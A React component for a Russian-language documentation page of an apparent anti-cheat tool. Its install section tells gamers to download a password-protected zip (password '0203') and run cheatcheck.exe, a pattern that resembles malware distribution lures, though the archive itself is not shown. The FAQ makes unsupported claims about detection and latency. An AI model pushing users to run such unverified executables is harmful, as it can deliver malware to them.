/**
 * Страница документации
 */
import React, { useState } from 'react';
import styled from 'styled-components';
import { motion } from 'framer-motion';
import AnimatedSection from '../components/AnimatedSection';
import { PrimaryButton } from '../components/Hero';

const Container = styled.div`
  min-height: 100vh;
  padding-top: 80px;
  background: ${({ theme }) => theme.colors.dark};
`;

const Content = styled.div`
  max-width: 1200px;
  margin: 0 auto;
  padding: 2rem;
  display: grid;
  grid-template-columns: 250px 1fr;
  gap: 3rem;

  @media (max-width: 768px) {
    grid-template-columns: 1fr;
  }
`;

const Sidebar = styled.aside`
  position: sticky;
  top: 100px;
  height: fit-content;
  background: rgba(255, 255, 255, 0.05);
  border-radius: 1rem;
  padding: 1.5rem;
  border: 1px solid rgba(255, 255, 255, 0.1);
`;

const SidebarTitle = styled.h3`
  font-size: 1.2rem;
  margin-bottom: 1rem;
  color: ${({ theme }) => theme.colors.primary};
`;

const SidebarLink = styled.a`
  display: block;
  padding: 0.75rem 1rem;
  color: ${({ $active, theme }) => 
    $active ? theme.colors.primary : theme.colors.light};
  text-decoration: none;
  border-radius: 0.5rem;
  margin-bottom: 0.5rem;
  transition: all 0.3s ease;
  background: ${({ $active, theme }) => 
    $active ? 'rgba(37, 99, 235, 0.1)' : 'transparent'};
  border-left: 3px solid ${({ $active, theme }) => 
    $active ? theme.colors.primary : 'transparent'};

  &:hover {
    background: rgba(37, 99, 235, 0.1);
    color: ${({ theme }) => theme.colors.primary};
  }
`;

const MainContent = styled.main``;

const Section = styled(AnimatedSection)`
  background: rgba(255, 255, 255, 0.05);
  border-radius: 1rem;
  padding: 2rem;
  margin-bottom: 2rem;
  border: 1px solid rgba(255, 255, 255, 0.1);

  &:last-child {
    margin-bottom: 0;
  }
`;

const SectionTitle = styled.h2`
  font-size: 2rem;
  margin-bottom: 1.5rem;
  color: ${({ theme }) => theme.colors.primary};
`;

const SubSectionTitle = styled.h3`
  font-size: 1.5rem;
  margin: 2rem 0 1rem;
  color: ${({ theme }) => theme.colors.light};
`;

const Paragraph = styled.p`
  margin-bottom: 1rem;
  line-height: 1.7;
  color: #cbd5e1;
`;

const CodeBlock = styled.pre`
  background: rgba(0, 0, 0, 0.3);
  border-radius: 0.5rem;
  padding: 1.5rem;
  margin: 1.5rem 0;
  overflow-x: auto;
  font-family: ${({ theme }) => theme.fonts.mono};
  font-size: 0.9rem;
  border: 1px solid rgba(255, 255, 255, 0.1);
`;

const Code = styled.code`
  background: rgba(0, 0, 0, 0.3);
  padding: 0.2rem 0.4rem;
  border-radius: 0.25rem;
  font-family: ${({ theme }) => theme.fonts.mono};
  font-size: 0.9rem;
`;

const List = styled.ul`
  margin: 1rem 0;
  padding-left: 1.5rem;
  color: #cbd5e1;
`;

const ListItem = styled.li`
  margin-bottom: 0.5rem;
  line-height: 1.6;
`;

const Documentation = () => {
  const [activeSection, setActiveSection] = useState('installation');

  const sections = [
    { id: 'installation', title: 'Установка' }, 
    { id: 'integration', title: 'Интеграция' },
    { id: 'faq', title: 'FAQ' },
  ];

  return (
    <Container>
      <Content>
        <Sidebar>
          <SidebarTitle>Содержание</SidebarTitle>
          {sections.map((section) => (
            <SidebarLink
              key={section.id}
              href={`#${section.id}`}
              $active={activeSection === section.id}
              onClick={() => setActiveSection(section.id)}
            >
              {section.title}
            </SidebarLink>
          ))}
        </Sidebar>

        <MainContent>
          <Section id="installation">
            <SectionTitle>Установка</SectionTitle>
            <Paragraph>
              Для начала работы с Anti-Cheat Pro выполните следующие шаги:
            </Paragraph>
            
            <SubSectionTitle>1. Установка</SubSectionTitle>
              <a className='down-but' href='./public/cheatcheck.zip'>Нажмите на этот текст, чтобы начать скачку.</a>
            <SubSectionTitle>2. Инициализация</SubSectionTitle>
            <Paragraph>
              1. Распакуйте архив (пароль: 0203).
            </Paragraph>
            <Paragraph>
              2. Запустите cheatcheck.exe
            </Paragraph>
          </Section>
          
          <Section id="integration">
            <SectionTitle>🔗 Интеграция</SectionTitle>
            <Paragraph>
              Проверка Cheatcheck проводилась с популярными играми и проектами:
            </Paragraph>
            
            <List>
              <ListItem>Unity Engine</ListItem>
              <ListItem>Unreal Engine 4/5</ListItem>
              <ListItem>Dota 2</ListItem>
              <ListItem>Counter-Strike 2</ListItem>
              <ListItem>Apex Legends</ListItem>
            </List>
          </Section>

          <Section id="faq">
            <SectionTitle>❓ Часто задаваемые вопросы</SectionTitle>
            
            <SubSectionTitle>Как работает детекция?</SubSectionTitle>
            <Paragraph>
              Мы используем комбинацию сигнатурного анализа, поведенческого анализа 
              и машинного обучения для обнаружения читов.
            </Paragraph>

            <SubSectionTitle>Какая задержка у системы?</SubSectionTitle>
            <Paragraph>
              Средняя задержка составляет менее 10мс, что незаметно для игроков.
            </Paragraph>

            <SubSectionTitle>Можно ли обойти проверку?</SubSectionTitle>
            <Paragraph>
              Наша система регулярно обновляется и использует несколько уровней обнаружения, 
              что делает обход крайне сложным.
            </Paragraph>
          </Section>
        </MainContent>
      </Content>
    </Container>
  );
};

export default Documentation;